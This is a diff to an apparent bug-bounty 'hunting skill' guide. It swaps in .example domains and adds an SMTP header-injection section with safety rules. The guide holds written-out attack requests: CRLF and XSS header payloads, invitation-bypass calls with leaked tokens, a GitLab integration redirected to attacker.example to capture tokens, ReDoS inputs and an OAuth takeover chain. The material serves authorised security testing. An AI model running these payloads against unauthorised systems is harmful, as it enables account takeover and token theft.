@@ -1,7 +1,7 @@
 ---
 name: hunt-misc
 description: Hunting skill for misc vulnerabilities. Built from 225 public bug bounty reports. Use when hunting misc on any target.
-sources: github, hackerone_public
+sources: github, hackerone_public, rfc_5322, python_email_docs
 report_count: 225
 ---
 
@@ -104,11 +104,11 @@ graphql { installations(
 **CRLF/Header Injection (Ruby Net::HTTP, Rack/pitchfork):**
 ```bash
 # Test CRLF in header values
-curl -v "https://target.com/path" \
+curl -v "https://target.example/path" \
   -H $'X-Custom: value\r\nInjected-Header: evil'
 
 # URL-encoded variant
-curl -v "https://target.com/redirect?url=https://evil.com%0d%0aSet-Cookie:%20session=attacker"
+curl -v "https://target.example/redirect?url=https://evil.example%0d%0aSet-Cookie:%20session=attacker"
 
 # Test in pitchfork/Rack apps — inject via query param reflected in Location header
 curl -v "https://shop.myshopify.com/login?return_to=%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>"
@@ -117,12 +117,12 @@ curl -v "https://shop.myshopify.com/login?return_to=%0d%0aContent-Type:%20text/h
 **Privilege escalation via invitation bypass:**
 ```bash
 # Accept invitation without email verification
-curl -X POST "https://target.com/invitations/INVITE_TOKEN/accept" \
+curl -X POST "https://target.example/invitations/INVITE_TOKEN/accept" \
   -H "Cookie: session=UNVERIFIED_SESSION" \
   -d '{"role":"admin"}'
 
 # Test invitation token for another user
-curl -X GET "https://target.com/partners/PARTNER_ID/invitation/accept?token=LEAKED_TOKEN" \
+curl -X GET "https://target.example/partners/PARTNER_ID/invitation/accept?token=LEAKED_TOKEN" \
   -H "Cookie: session=VICTIM_SESSION"
 ```
 
@@ -142,7 +142,7 @@ curl -H "Authorization: Bearer USER_TO_SERVER_TOKEN" \
 # Change Sentry URL to internal listener
 curl -X PUT "https://gitlab.com/api/v4/projects/PROJECT_ID/services/sentry" \
   -H "PRIVATE-TOKEN: MAINTAINER_TOKEN" \
-  -d '{"api_url": "https://attacker.com/capture", "auth_token": "sentry_token"}'
+  -d '{"api_url": "https://attacker.example/capture", "auth_token": "sentry_token"}'
 ```
 
 **ReDoS detection:**
@@ -154,8 +154,8 @@ ruby -e 'require "uri"; URI.parse("http://a.com?" + "a"*5000 + "##")'
 ruby -e 'require "ipaddr"; IPAddr.new("0." * 1000 + "0")'
 
 # Timing-based detection
-time curl "https://target.com/search?q=aaaa" # baseline
-time curl "https://target.com/search?q=$(python3 -c 'print("a"*5000 + "##")')"
+time curl "https://target.example/search?q=aaaa" # baseline
+time curl "https://target.example/search?q=$(python3 -c 'print("a"*5000 + "##")')"
 ```
 
 **Grep patterns for source recon:**
@@ -184,6 +184,24 @@ curl -sI https://handbook.gitlab.com | head -5
 dig TXT rubylang.org | grep spf
 # Missing or ~all = email spoofing risk
 ```
+
+### SMTP (email) header injection from a web form
+
+Distinct from the CRLF/HTTP-header case above: here a web form field (sender name, subject, reply-to, the user's own email) flows into a **generated email**, and a newline in that field injects a new **mail** header. Per RFC 5322 a header field is terminated by CRLF and its body may not contain CR/LF except as folding (a CRLF *immediately followed by whitespace*); so a bare `%0d%0a` in a user field that is **not** followed by whitespace starts a new header — letting an attacker add `Bcc:`/`Cc:`/`Reply-To:` or rewrite headers. `%0a` (LF alone) is sometimes enough depending on how the app splits lines.
+
+```bash
+# Stage A — detect, mailing ONLY an address you control. Inject a Bcc to your own
+# mailbox plus a trailing dummy header so any text the app appends (e.g. "!") lands
+# on the dummy line, not on your injected address.
+curl -s "https://target.example/contact" \
+  --data-urlencode $'name=tester%0d%0aBcc: <you@your-mailbox.example>%0d%0aX-Canary: cpmark987abc' \
+  --data "message=hello"
+# Proof = that benign copy arrives in YOUR mailbox (confirms the header was honoured).
+```
+
+Modern mail libraries resist this: Python's `email.policy` header factory raises `ValueError` on CR/LF in a header value, and `email.headerregistry.Address` disallows CR/LF (bpo-39073, backported to 3.6.13). The classic vulnerable surface is PHP `mail()` and hand-assembled SMTP conversations that concatenate user input into headers without stripping line breaks.
+
+> **Safety — this sends real mail to real people, the sharpest constraint in this skill.** Every recipient you inject MUST be an address you control. Proving the bug by mailing a third party is never acceptable. Never inject a non-existent address: hard bounces can suspend the target's own sending reputation (AWS SES and similar suspend senders past a bounce threshold), which is a denial of service. Never rewrite the `Subject` or body, because crafting mail to the target's staff is phishing-adjacent and out of scope. Send one probe per field; do not loop.
 
 ---
 
@@ -306,9 +324,9 @@ A checklist tells you what to look for one bug at a time. Senior work composes p
 
 ### Chain 6 — Subdomain Takeover at OAuth `redirect_uri` Allowlist → Auth-Code Theft → ATO
 
-- **A.** Enumerate OAuth `redirect_uri` allowlist via the `/oauth/authorize` flow; note any wildcard `*.target.com` or takeover-candidate hostname in the static list.
-- **B.** Find a takeover-able subdomain (`legacy.target.com` CNAME'd to deleted Vercel project / Heroku app / S3 bucket — `hunt-subdomain` step 1).
-- **C.** Claim the subdomain. Host an OAuth callback receiver. Send victim to `/oauth/authorize?redirect_uri=https://legacy.target.com/cb&response_type=code&...`. Auth code lands on attacker host. Exchange via token endpoint. ATO.
+- **A.** Enumerate OAuth `redirect_uri` allowlist via the `/oauth/authorize` flow; note any wildcard `*.target.example` or takeover-candidate hostname in the static list.
+- **B.** Find a takeover-able subdomain (`legacy.target.example` CNAME'd to deleted Vercel project / Heroku app / S3 bucket — `hunt-subdomain` step 1).
+- **C.** Claim the subdomain. Host an OAuth callback receiver. Send victim to `/oauth/authorize?redirect_uri=https://legacy.target.example/cb&response_type=code&...`. Auth code lands on attacker host. Exchange via token endpoint. ATO.
 - **Impact:** Persistent 1-click ATO every time the OAuth flow runs against the affected client.
 - **Real shape:** Microsoft Azure DevOps `cloudapp.azure.com` + wildcard `*.visualstudio.com` reply_to chain (Binary Security, Nov 2022). Cross-refs `hunt-subdomain` Disclosed Report Citation #12.
 
